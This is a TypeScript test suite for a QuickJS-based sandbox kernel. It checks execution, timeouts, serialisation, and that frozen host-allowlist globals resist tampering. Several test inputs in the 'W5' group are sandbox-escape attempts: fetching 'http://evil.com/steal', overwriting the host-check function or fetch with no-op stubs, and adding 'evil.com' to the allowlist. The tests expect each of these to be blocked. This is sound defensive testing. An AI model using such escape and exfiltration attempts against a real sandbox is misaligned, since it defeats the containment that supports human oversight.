import { QuickJSKernel } from "./QuickJSKernel.js";

// One shared kernel for the file — avoids multiple QuickJS runtime init/dispose
// cycles which cause WASM GC assertion failures on process exit.
const kernel = new QuickJSKernel();

describe("QuickJSKernel (edge-safe, no node:vm)", () => {
  afterAll(async () => {
    await kernel[Symbol.asyncDispose]();
  });

  // ---------------------------------------------------------------------------
  // W5 — Global guard freeze tests
  //
  // These tests verify that the security-critical globals injected by
  // #injectFetchWrapper (__check_host__, __allowed_hosts__, fetch) are frozen
  // (non-configurable, non-writable) so sandbox code cannot bypass the
  // allowedHosts check by overwriting or deleting them.
  // ---------------------------------------------------------------------------
  describe("W5: frozen capability globals resist sandbox bypass", () => {
    // A fresh kernel per test group so freeze state is predictable.
    const secKernel = new QuickJSKernel();
    afterAll(async () => {
      await secKernel[Symbol.asyncDispose]();
    });

    const allowedHosts = ["example.com"];
    const caps = { allowedHosts };

    it("fetch correctly rejects a disallowed host", async () => {
      await expect(
        secKernel.run(
          `fetch("http://evil.com/steal").then(function(){return "ok";}, function(e){return e.message;})`,
          caps
        )
      ).rejects.toThrow(/CapabilityDenied/);
    });

    it("overwriting __check_host__ does not bypass the real host check", async () => {
      // Sandbox tries to replace __check_host__ with a no-op. Because the
      // global is frozen, the assignment silently fails (non-strict) or throws
      // (strict). Either way the original __check_host__ function must still
      // be the one that runs when fetch is called with an unauthorised host.
      await expect(
        secKernel.run(
          `
          __check_host__ = function() { return true; };
          fetch("http://evil.com/steal");
          `,
          caps
        )
      ).rejects.toThrow(/CapabilityDenied/);
    });

    it("'use strict' overwrite attempt also fails (TypeError in strict mode)", async () => {
      // In strict mode a write to a non-writable property throws TypeError.
      // The kernel should catch it and surface it as KernelError (not a bypass).
      const result = await secKernel
        .run(
          `
          (function() {
            "use strict";
            try {
              __check_host__ = function() {};
              return "overwritten";
            } catch(e) {
              return e instanceof TypeError ? "TypeError" : "OtherError:" + e.message;
            }
          }())
          `,
          caps
        )
        .catch((e: Error) => ({ threw: true, message: e.message }));
      // Either the assignment threw TypeError (ideal), or it silently failed
      // and the return value is NOT "overwritten". We must NOT get "overwritten".
      if (typeof result === "object" && "threw" in result) {
        // A KernelError is also acceptable — means strict mode threw.
        expect((result as { message: string }).message).toMatch(/KernelError|TypeError/);
      } else {
        expect((result as { output: unknown }).output).not.toBe("overwritten");
      }
    });

    it("delete __check_host__ does not remove it", async () => {
      // delete on a non-configurable property returns false / throws in strict.
      const result = await secKernel.run(
        `
        var deleted = delete __check_host__;
        typeof __check_host__
        `,
        caps
      );
      // After the delete attempt the global must still be a function.
      expect(result.output).toBe("function");
    });

    it("__allowed_hosts__ array is frozen — push/pop are blocked", async () => {
      // The hosts array itself must be frozen so sandbox code cannot add
      // new hosts via __allowed_hosts__.push("evil.com").
      const result = await secKernel.run(
        `
        var before = __allowed_hosts__.length;
        try { __allowed_hosts__.push("evil.com"); } catch(e) {}
        __allowed_hosts__.length === before ? "still-frozen" : "mutated"
        `,
        caps
      );
      expect(result.output).toBe("still-frozen");
    });

    it("__allowed_hosts__ cannot be replaced with a new array", async () => {
      // Replacing the global with a different array (to add evil hosts) must
      // not work — the property is non-writable.
      const result = await secKernel.run(
        `
        __allowed_hosts__ = ["evil.com"];
        __allowed_hosts__[0]
        `,
        caps
      );
      // If the assignment was silently ignored, the value is still "example.com".
      expect(result.output).toBe("example.com");
    });

    it("fetch global cannot be replaced with a no-op", async () => {
      // Replacing fetch with a permissive stub must not work.
      await expect(
        secKernel.run(
          `
          fetch = function() { return Promise.resolve("bypassed"); };
          fetch("http://evil.com/steal");
          `,
          caps
        )
      ).rejects.toThrow(/CapabilityDenied/);
    });

    it("property descriptor shows non-configurable, non-writable", async () => {
      // Verify the descriptor directly via Object.getOwnPropertyDescriptor.
      const result = await secKernel.run(
        `
        var d = Object.getOwnPropertyDescriptor(globalThis, "__check_host__");
        JSON.stringify({ configurable: d.configurable, writable: d.writable })
        `,
        caps
      );
      const desc = JSON.parse(result.output as string) as {
        configurable: boolean;
        writable: boolean;
      };
      expect(desc.configurable).toBe(false);
      expect(desc.writable).toBe(false);
    });

    it("capability globals are cleared between runs when capability is dropped", async () => {
      // A run WITH allowedHosts should set fetch; a subsequent run WITHOUT
      // should see fetch as undefined (capability cleared between runs).
      await secKernel.run("1 + 1", caps);
      const result = await secKernel.run("typeof fetch");
      // fetch should be undefined when no allowedHosts capability is provided.
      expect(result.output).toBe("undefined");
    });

    it("host-check still works after multiple run() cycles", async () => {
      // Run a clean cycle, then re-inject, then verify the guard fires.
      await secKernel.run("1 + 1");
      await expect(secKernel.run(`fetch("http://blocked.com/")`, caps)).rejects.toThrow(
        /CapabilityDenied/
      );
    });
  });

  it("executes simple JS and returns output", async () => {
    const result = await kernel.run("1 + 2");
    expect(result.output).toBe(3);
    expect(result.isFinalAnswer).toBe(false);
  });

  it("captures console.log as logs", async () => {
    const result = await kernel.run('console.log("hello from quickjs"); 42');
    expect(result.logs).toContain("hello from quickjs");
    expect(result.output).toBe(42);
  });

  it("persists variables across run() calls (stateful context)", async () => {
    await kernel.run("var x = 21;");
    const result = await kernel.run("x * 2");
    expect(result.output).toBe(42);
  });

  it("signals final answer via __finalAnswer__", async () => {
    const result = await kernel.run('__finalAnswer__ = "done";');
    expect(result.isFinalAnswer).toBe(true);
    expect(result.output).toBe("done");
  });

  it("null is a valid final answer — matches JsKernel semantics", async () => {
    const result = await kernel.run("__finalAnswer__ = null;");
    expect(result.isFinalAnswer).toBe(true);
    expect(result.output).toBeNull();
  });

  it("resets state on reset()", async () => {
    await kernel.run("var y = 99;");
    await kernel.reset();
    await expect(kernel.run("y")).rejects.toThrow(/KernelError/);
  });

  it("throws KernelError on invalid syntax", async () => {
    await expect(kernel.run("def broken(")).rejects.toThrow(/KernelError/);
  });

  it("kills synchronous infinite loop via interrupt handler", async () => {
    const timedKernel = new QuickJSKernel({ timeoutMs: 500 });
    await expect(timedKernel.run("while(true){}")).rejects.toThrow(/timed out/);
    // After timeout, kernel auto-resets — next call should work.
    const result = await timedKernel.run("2 + 2");
    expect(result.output).toBe(4);
    await timedKernel[Symbol.asyncDispose]();
  }, 5_000);

  it("snapshot and restore are not implemented (optional interface)", () => {
    const k = kernel as import("@wasmagent/core/executor").WasmKernel;
    expect(k.snapshot).toBeUndefined();
    expect(k.restore).toBeUndefined();
  });

  it("throws KernelSerializationError for circular reference output (matches JsKernel DataCloneError behaviour)", async () => {
    // QuickJS ctx.dump() would silently turn a circular ref into "[object Object]".
    // The serialisation guard detects this and throws explicitly.
    await expect(kernel.run("var o = {}; o.self = o; o")).rejects.toThrow(
      /KernelSerializationError/
    );
  });

  it("returns JSON-serialisable objects cleanly", async () => {
    const result = await kernel.run('({ a: 1, b: [2, 3], c: "hello" })');
    expect(result.output).toEqual({ a: 1, b: [2, 3], c: "hello" });
  });
});
